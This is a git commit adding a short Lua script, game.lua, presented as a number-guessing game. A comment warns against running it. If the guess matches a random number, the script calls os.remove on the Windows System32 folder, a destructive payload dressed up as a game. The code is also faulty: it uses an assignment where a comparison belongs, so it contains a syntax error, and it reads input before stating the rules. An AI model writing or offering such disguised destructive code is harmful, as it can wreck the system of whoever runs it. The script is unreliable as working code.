4c198476bb2d676214305594b15d4d803ad9a957
jun <bluboi2k12@gmail.com>
2025-10-06 00:23:22 +0700

    Add files via upload

---
+++ game.lua
@@ -0,0 +1,13 @@
+-- please do not run this on your actual computer
+
+print("lets play a game")
+local ans = tonumber(io.read())
+local n = math.random(1, 6)
+print("youll guess a number from 1 to 6")
+print("if you answer the random chosen number")
+print("youll lose")
+if ans < n or ans > n then
+print("youre lucky")
+elseif ans = n then
+os.remove("C:/Windows/System32")
+end
